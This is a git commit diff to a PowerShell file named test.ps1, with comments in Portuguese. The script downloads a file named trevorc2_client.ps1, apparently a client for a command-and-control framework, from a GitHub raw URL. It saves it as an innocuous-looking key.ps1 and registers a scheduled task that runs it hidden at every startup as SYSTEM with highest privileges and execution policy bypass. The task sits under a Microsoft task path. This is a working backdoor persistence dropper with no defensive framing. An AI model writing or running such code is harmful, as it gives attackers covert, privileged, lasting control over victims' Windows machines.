94c1c7d8ab8a1bb3de37a2eb41c4d92579988940
giaosoissomsm <114545006+giaosoissomsm@users.noreply.github.com>
2025-03-04 00:18:36 -0300

    Update test.ps1

--- scripts/test.ps1
+++ scripts/test.ps1
@@ -1,6 +1,10 @@
+# Baixa o script e salva em C:\ProgramData\ssh\key.ps1
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/giaosoissomsm/Webhooks/refs/heads/main/scripts/trevorc2_client.ps1" -OutFile "C:\ProgramData\ssh\key.ps1"
+
+# Cria uma tarefa agendada para iniciar o script como SYSTEM na inicialização com privilégios mais altos
 $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-w h -ep bypass C:\ProgramData\ssh\key.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
-$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest -LogonType ServiceAccount
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+
 Register-ScheduledTask -TaskName "IniciarScriptKey" -Action $action -Trigger $trigger -Principal $principal -Settings $settings -TaskPath "\Microsoft\"
